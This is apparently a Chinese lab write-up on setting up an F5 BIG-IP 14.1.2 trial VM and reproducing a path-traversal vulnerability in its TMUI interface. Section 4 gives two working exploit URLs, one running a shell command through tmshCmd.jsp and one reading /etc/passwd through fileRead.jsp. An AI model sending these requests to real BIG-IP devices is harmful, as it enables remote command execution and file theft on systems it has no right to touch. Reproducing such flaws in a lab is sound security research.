---
description: 图是偷的，过程是自己的
---

# F5 big-ip从环境搭建到漏洞复现

### 1、 注册账号

去F5官网下载90天试用版本。 地址：[https://f5.com/zh/products/trials/product-trials](https://f5.com/zh/products/trials/product-trials)

打开网站后，选择BIG-IP云版本

![](../.gitbook/assets/bigip01.jpg)

 

点击后，按照页面中的指示开始注册账号并申请key

```text
1. 登录或注册
使用 F5 支持 ID 登录，并申请试用版密钥。
若无 F5 支持帐户，请单击下方链接进行创建。

2. 申请密钥
登录后，请选择 BIGIP 云版本及所需的许可数量。订单将通过您创建支持帐户时使用的电子邮件发送给您。

3. 下载软件
您可在等待密钥期间下载软件。只需选择虚拟机监控程序（见下文）开始下载即可。

4. 启动
请使用密钥解锁试用版，并开始在自己的环境中设置 BIG-IP 云版本。使用我们的其中一种云解决方案模板即可快速开始配置。
```

注册地址如下：[https://login.f5.com/resource/login.jsp?ctx=719748](https://login.f5.com/resource/login.jsp?ctx=719748)

若没有账号，点击页面中的`create one`即可开始注册

![](../.gitbook/assets/bigip02.jpg)

因为我已经注册了，所以下面的步骤就不显示了，总之第一步，会输入邮箱地址

![](../.gitbook/assets/bigip03.jpg)



之后在邮箱中会出现一个设置密码的链接

![](../.gitbook/assets/bigip04.jpg)

（鬼知道中间省略了多少个步骤）

按照提示申请完秘钥之后，会收到这样一封邮件：

![](../.gitbook/assets/bigip05.jpg)

### 2、 导入虚拟机

下载BIG-IP的.ova文件，这里因为在外面下载的太慢了，百度链接如下：  
14.1.2版本OVA文件：  
链接：[https://pan.baidu.com/s/1VFHVwLhiDsW3W2x7fwcUuw](https://pan.baidu.com/s/1VFHVwLhiDsW3W2x7fwcUuw)   
提取码：rbtk

14.1.2版本VMDK文件：（打开虚拟机，配置IP后可**直接**漏洞利用，root,admin/Admin!@\#456）  
链接：[https://pan.baidu.com/s/1FdWZg9lf7dF109pLxedn7A](https://pan.baidu.com/s/1FdWZg9lf7dF109pLxedn7A) 提取码：ali4

下载成功后，导入到虚拟机，开机即可

开机后，会提示输入密码，前两次都是默认账号密码：root/default

![](../.gitbook/assets/bigip06.jpg)

之后修改密码，要求：必须包含大小写字母与数字，符号，长度不得小于8位，此处可设置Admin!@\#456

设置该虚拟机的网络，网卡任意模式即可 （原有好几块网卡，可以删除一些，最后只剩一张）

![](../.gitbook/assets/bigip07.jpg)

在/config目录下，输入config，设置IP地址，默认选择IPV4，然后连续按两次回车，等待命令行出现即可

![](../.gitbook/assets/bigip08.jpg)

设置好IP地址后，建议使用nmap等端口扫描工具扫一下，毕竟我的环境和小伙伴的环境BIGIP的运行端口都不一样

打开网站，用户名与密码不是默认的admin/admin（那是高版本的），而是刚设置的Admin!@\#456

### 3、 激活big-ip

此时网站处于未激活状态，可点击NEXT进行激活

![](../.gitbook/assets/bigip09.jpg)

输入申请到的邮箱里的registration key.点击Next

![](../.gitbook/assets/bigip10.jpg)

将1中的内容复制到2中新开的网页中并NEXT，最后将生成的内容粘贴到3中即可

![](../.gitbook/assets/bigip11.jpg)

![](../.gitbook/assets/bigip12.jpg)

重新登录，即可激活成功

### 4、 漏洞利用

```text
RCE:
http://IP:PORT/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami

文件读取：
http://IP:PORT/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
```

效果图如下：

![](../.gitbook/assets/bigip13.jpg)





